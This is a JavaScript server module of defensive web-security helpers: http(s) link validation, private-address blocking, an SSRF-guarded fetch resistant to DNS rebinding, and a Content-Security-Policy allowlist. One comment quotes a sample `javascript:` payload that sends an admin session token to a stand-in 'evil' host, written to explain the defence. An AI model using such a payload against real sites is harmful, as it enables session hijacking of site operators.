/**
 * Security primitives: URL scheme validation, SSRF-safe outbound fetch, and the
 * Content-Security-Policy directives for the SPA.
 *
 * These live apart from the route layer because they are pure, self-contained,
 * and the only part of the server that can be exercised without a database —
 * see server/test/security.test.js.
 */
import dns from 'node:dns/promises';
import net from 'node:net';
import http from 'node:http';
import https from 'node:https';

/**
 * Any URL that originates from a user and is later rendered into an <a href> has
 * to be scheme-checked. React does not strip `javascript:` hrefs, so a creator
 * could submit `javascript:fetch('//evil/?t='+sessionStorage.clicki_admin_token)`
 * as their video link and steal the operator's session the moment they click it
 * in the review queue.
 *
 * @returns the URL when it is a plain http(s) link, otherwise null.
 */
export function safeHttpUrl(value) {
  const s = String(value ?? '').trim();
  if (!s || s.length > 2000) return null;
  try {
    const u = new URL(s);
    return u.protocol === 'http:' || u.protocol === 'https:' ? u.toString() : null;
  } catch {
    return null;
  }
}

/** True for loopback, private, link-local (cloud metadata), CGNAT, multicast and reserved space. */
export function isPrivateIp(ip) {
  const type = net.isIP(ip);
  if (type === 4) {
    const [a, b] = ip.split('.').map(Number);
    return (
      a === 0 || a === 10 || a === 127 ||
      (a === 100 && b >= 64 && b <= 127) || // CGNAT 100.64/10
      (a === 169 && b === 254) || // link-local — cloud metadata lives at 169.254.169.254
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 192 && b === 0) || // 192.0.0/24 IETF protocol assignments
      (a === 198 && (b === 18 || b === 19)) || // benchmarking
      a >= 224 // multicast + reserved
    );
  }
  if (type === 6) {
    const low = ip.toLowerCase();
    if (low.startsWith('::ffff:')) return isPrivateIp(low.slice(7)); // IPv4-mapped
    return (
      low === '::1' || low === '::' ||
      low.startsWith('fc') || low.startsWith('fd') || // unique-local
      low.startsWith('fe80') // link-local
    );
  }
  return true; // not a valid IP → treat as unsafe
}

/**
 * The obvious "resolve, check the IP, then fetch the hostname" shape is
 * exploitable: the fetch performs its OWN resolution, and an attacker-controlled
 * DNS server can answer the first query with a public IP and the second with
 * 169.254.169.254 (DNS rebinding / TOCTOU). Handing validation to the socket
 * layer via `lookup` means the address we approve is the address we connect to.
 */
export function guardedLookup(hostname, options, callback) {
  dns
    .lookup(hostname, { all: true })
    .then((addresses) => {
      if (!addresses.length || addresses.some((a) => isPrivateIp(a.address))) {
        return callback(new Error(`Blocked: ${hostname} resolves to a private address`));
      }
      if (options?.all) return callback(null, addresses);
      callback(null, addresses[0].address, addresses[0].family);
    })
    .catch(callback);
}

const FETCH_ALLOWED_PORTS = new Set([80, 443]);
export const FETCH_MAX_BYTES = 512 * 1024;

/**
 * GET a URL with SSRF guards: public addresses only, ports 80/443, no redirects,
 * HTML/text responses only, hard byte cap. Resolves to the body, or throws.
 */
export function fetchGuarded(urlStr, { timeoutMs = 6000 } = {}) {
  return new Promise((resolve, reject) => {
    let u;
    try {
      u = new URL(urlStr);
    } catch {
      return reject(new Error('Malformed URL'));
    }
    if (!/^https?:$/.test(u.protocol)) return reject(new Error('Only http(s) URLs are allowed'));

    const port = u.port ? Number(u.port) : u.protocol === 'https:' ? 443 : 80;
    if (!FETCH_ALLOWED_PORTS.has(port)) return reject(new Error('Only ports 80/443 are allowed'));

    // A literal IP never goes through `lookup` (net.connect short-circuits DNS),
    // so it has to be checked here — safe to do eagerly, there is nothing to rebind.
    const bare = u.hostname.replace(/^\[|\]$/g, '');
    if (net.isIP(bare) && isPrivateIp(bare)) return reject(new Error('Blocked: private address'));

    const mod = u.protocol === 'https:' ? https : http;
    const req = mod.request(
      {
        protocol: u.protocol,
        hostname: u.hostname,
        port,
        path: `${u.pathname}${u.search}`,
        method: 'GET',
        lookup: guardedLookup,
        timeout: timeoutMs,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; ClickiBriefBot/1.0)',
          Accept: 'text/html,application/xhtml+xml,text/plain',
        },
      },
      (res) => {
        // Never follow redirects — a 302 to 169.254.169.254 is the whole game.
        if (res.statusCode !== 200) {
          res.destroy();
          return reject(new Error(`Upstream responded ${res.statusCode}`));
        }
        if (!/^(text\/html|text\/plain|application\/xhtml\+xml)/i.test(String(res.headers['content-type'] || ''))) {
          res.destroy();
          return reject(new Error('Unsupported content type'));
        }
        const chunks = [];
        let size = 0;
        res.on('data', (chunk) => {
          size += chunk.length;
          if (size > FETCH_MAX_BYTES) {
            res.destroy(); // stop a hostile server streaming gigabytes at us
            return;
          }
          chunks.push(chunk);
        });
        res.on('close', () => resolve(Buffer.concat(chunks).toString('utf8')));
        res.on('error', reject);
      }
    );
    req.on('timeout', () => req.destroy(new Error('Upstream timed out')));
    req.on('error', reject);
    req.end();
  });
}

/** Fetch a page and reduce it to plain text for the AI brief constructor. Null on any failure. */
export async function fetchPageText(url) {
  try {
    const html = await fetchGuarded(url);
    const text = html
      .replace(/<script[\s\S]*?<\/script>/gi, ' ')
      .replace(/<style[\s\S]*?<\/style>/gi, ' ')
      .replace(/<[^>]+>/g, ' ')
      .replace(/\s+/g, ' ')
      .trim();
    return text.slice(0, 3000) || null;
  } catch (err) {
    console.error('[brief-constructor] page fetch skipped:', err.message);
    return null;
  }
}

/**
 * CSP for the SPA. Previously disabled outright, which left the client with no
 * defence-in-depth against injected script. The allowlist is the exact set of
 * third parties the client loads (analytics, fonts, reCAPTCHA); notably
 * `script-src` has no 'unsafe-inline', which is what neutralises a stored
 * `javascript:` URL and any injected <script>.
 */
export function buildCspDirectives({ isProd = false, mediaHosts = [] } = {}) {
  const hosts = mediaHosts.filter(Boolean);
  const directives = {
    defaultSrc: ["'self'"],
    // Analytics + reCAPTCHA loaders inject <script src>; none need inline script.
    scriptSrc: [
      "'self'",
      'https://www.googletagmanager.com',
      'https://connect.facebook.net',
      'https://mc.yandex.ru',
      'https://www.google.com',
      'https://www.gstatic.com',
      // Google Identity Services — the "Sign in with Google" button (/google-test).
      'https://accounts.google.com',
      // The 3D hero's Draco/GLTF decoder compiles WebAssembly; without this
      // CSP's WASM-compile gate (governed by script-src, not worker-src)
      // throws a CompileError even once the worker itself is allowed to run.
      "'wasm-unsafe-eval'",
    ],
    // React/framer-motion write inline `style` attributes; Google Fonts ships a
    // stylesheet; GIS (accounts.google.com) injects one for its button.
    styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com', 'https://accounts.google.com'],
    fontSrc: ["'self'", 'https://fonts.gstatic.com', 'data:'],
    // jsdelivr serves the Twemoji sprites that lib/emoji.js swaps every
    // emoji on the public pages for. Leaving it out did not merely un-style them:
    // each blocked image restored its text node, the MutationObserver read that
    // as new content, and the page rebuilt the same blocked image ~60×/second,
    // forever, on every public page.
    imgSrc: [
      "'self'", 'data:', 'blob:',
      'https://cdn.jsdelivr.net',
      'https://images.unsplash.com', 'https://mc.yandex.ru', 'https://www.facebook.com',
      // Google account avatars shown after a Google sign-in (/google-test).
      'https://*.googleusercontent.com',
      ...hosts,
    ],
    mediaSrc: ["'self'", 'blob:', ...hosts],
    connectSrc: [
      "'self'",
      'https://www.google-analytics.com',
      'https://region1.google-analytics.com',
      'https://connect.facebook.net',
      'https://mc.yandex.ru',
      // GIS status/telemetry XHR from the Sign in with Google button.
      'https://accounts.google.com',
    ],
    // reCAPTCHA challenge iframe + the GIS button/account-chooser iframe.
    frameSrc: ["'self'", 'https://www.google.com', 'https://accounts.google.com'],
    // The 3D hero (Hub page) loads its GLTF/Draco decoder via a `new
    // Worker(blobURL)` — without this, worker-src falls back to script-src
    // (no blob:) and the worker construction is silently blocked.
    workerSrc: ["'self'", 'blob:'],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    frameAncestors: ["'self'"],
  };
  if (isProd) directives.upgradeInsecureRequests = [];
  return directives;
}
